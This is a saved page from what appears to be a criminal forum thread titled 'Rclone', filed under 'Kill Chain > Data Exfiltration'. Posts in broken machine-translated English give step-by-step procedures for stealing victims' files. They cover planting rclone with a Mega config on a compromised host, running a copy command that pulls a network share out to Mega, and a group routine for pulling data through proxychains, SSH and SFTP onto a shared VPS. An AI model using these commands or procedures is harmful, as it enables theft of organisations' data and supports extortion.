@@ -1,0 +1,177 @@
+    Vampir
+    New Topics
+    New replies
+
+    Start
+    Help
+    Search
+    Profile
+    Private Messages
+    Members
+
+Monica Bellucci Fan Club
+
+    Monica Bellucci Fan Club "
+    Kill Chain "
+    Data Exfiltration "
+    Rclone
+
+Rclone
+Alter - 2 - 46
+" previous topic next topic "
+
+Pages: 1
+Alter
+
+    Administrator
+    Member
+    *****
+        28
+        View Profile Private Message (Offline)
+
+: February 05, 2021, 11:30:36 am
+Written by
+
+1. download the program itself (posted in general), create a file rclone.conf and put it in the same folder as the exe
+2. Next, open the kmd from the admin, go to the folder where the software is located with the configuration file and run the command: rclone config
+3. Then pop up menu, where we create a config (roughly speaking, roll in the gods mega), after the gods rolled in, the program writes them to the file rclone.conf, in encrypted form.
+4. Take this rclone.conf file and the program itself and put it on the host from which we are going to download the information.
+5. Fall into the cobweb into the folder where you put the config and the program and run the command:
+
+shell rclone.exe copy "\trucamtldc01\E$\Data" remote:Data -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12
+
+Well, I think it is clear here, what is in quotes is what we download, we can specify anything, even the whole disk
+remote - the name of the config that we specified in step 3, data - the folder in the mega, where the info is downloaded
+
+credits go to @brandon
+" Last edited: Feb 11, 2021, 02:12:19 am by Alter "
+
+giovanni
+
+    Users
+    Member
+    *
+        2
+        View Profile E-mail Personal Message (Offline)
+
+Response #1 : February 18, 2021, 05:10:33 pm
+Written by
+
+Regulations for pouring data to the grandfather with Rclone
+The process is built on the following principle.
+A single Rclone configuration file is used for all users, which lies in /var/www/rclone.conf.
+This is where all the remote ones are collected and from where we pump out the data.
+We download only from our VPS, or from other remote storages such as megs. We never download directly from targets.
+Everyone connects via SSH under his account, configures remote (if it is not configured yet), creates new tmux session, starts copying process.
+
+Connecting via SSH
+Code: [Highlight]
+
+proxychains4 ssh USER@IP
+
+At the first connection you will be asked to add a Fingerprint, enter "yes".
+USER - your user name, for example looper.
+IP is the IP address of the grandfather.
+Next, enter the password.
+
+Add a new remote
+Code: [Highlight].
+
+rclone --config /var/www/rclone.conf config
+
+First see if remote has already been added by someone else.
+Let's configure it using the example of VPS with SFTP.
+Choose "n) New remote", enter "n".
+As a name we specify a smart name, specifying whose IP address without a dot, for example, rz16696.
+If you are downloading from mega, specify mega-EMAIL.
+EMAIL - mail, on which mega account is registered, the part before "@".
+Then we specify the type of Storage, for example sftp.
+Then we specify the host, i.e. IP address from where we are going to download.
+Then we specify the user, the name of the user we are going to download from, for example root.
+Then we specify port, usually it is standard SFTP SSH connection port, i.e. 22.
+The next step is password, choose "y) Yes type in my own password", entering "y", enter the password from the Storage user, then enter again confirming it.
+The following values are for more flexible configuration, which is not needed at this stage, so just press ENTER on them: key_pem, key_file.
+Next select "n) No leave this optional password blank (default)" by typing "n" or just press ENTER.
+Then for pubkey_file, key_use_agent, use_insecure_cipher, disable_hashcheck we also leave the standard value, just press ENTER.
+In the standard situation we do not need to edit Advanced config, so choose "n) No (default)", enter "n", or just press ENTER.
+Watch the result of the configuration, if everything is OK, choose "y) Yes this is OK (default)" by typing "y" or just pressing ENTER.
+Exit the configurator by selecting "q) Quit config", enter "q", press ENTER.
+
+Check the created remote
+An optional step to make sure that remote is added correctly.
+Code: [Highlight]
+
+rclone --config /var/www/rclone.conf ls REMOTE:BUCKET
+
+REMOTE is the name of the remote, for example rz16696.
+BUCKET - the path to the files on the remote, for example /home/filterek.
+
+Create a tmux session
+Code: [Highlight]
+
+tmux new -s NAME
+
+NAME - the name of the session, we call it by the following principle. Name of the case (domain without domain zone, i.e. part before the dot), then lower underscore _, which procedure (in our case copy), lower underscore _, name of remote (for example rz16696). Final example: filterek_copy_rz16696.
+
+Start copying
+Code: [Highlight].
+
+rclone --config /var/www/rclone.conf -P copy REMOTE:BUCKET PATH -q --ignore-existing --auto-confirm
+
+REMOTE is the name of the remote, for example rz16696.
+BUCKET - The path to the files on the remote, for example /home/filterek.
+PATH is the path to copy to on the remote. Each user has its own folder, which is located in /var/www/USER_NAME/data, where USER_NAME - your user name. To this folder we copy according to the following principle. First, the name of the case as in the rocket (domain with a domain zone), such as filterek.com, then the name of the car, from which the data were downloaded, such as ADMS-FILE, then folders as they are structured on the car, from which we download. The final example: /var/www/looper/data/filterek.com/ADMS-FILE/Finance.
+After starting Rclone, wait until it calculates all the files and starts displaying the download process.
+
+Disconnect from the tmux session
+Press CTRL + B, then press D.
+
+Disconnect from SSH
+Disconnect from ssh with CTRL+D.
+
+Checking download status
+Connect via ssh.
+Code: [Highlight]
+
+tmux ls
+
+We see a list of tmux sessions.
+
+Connect to the tmux session.
+Code: [Highlight]
+
+tmux a -t NAME
+
+NAME - the name of the tmux session, for example, filterek_copy_rz16696.
+You can see the download process.
+
+After the download process is complete
+After the download is complete, kill the tmux session.
+Code: [Highlight]
+
+tmux kill-session -t NAME
+
+NAME - the name of the tmux session, for example filterek_copy_rz16696.
+
+The tmux toolkit
+https://gist.github.com/MohamedAlaa/2961058
+
+A brief introduction to SFTP
+For a general introduction.
+https://www.digitalocean.com/community/tutorials/sftp-ru
+
+Pages: 1
+
+    Monica Bellucci Fan Club "
+    Kill Chain "
+    Data Exfiltration "
+    Rclone
+
+Go to:
+ 
++ Quick Reply
+
+    SMF 2.0.18 | SMF © 2020, Simple Machines
+    Developed with SychO
+
+
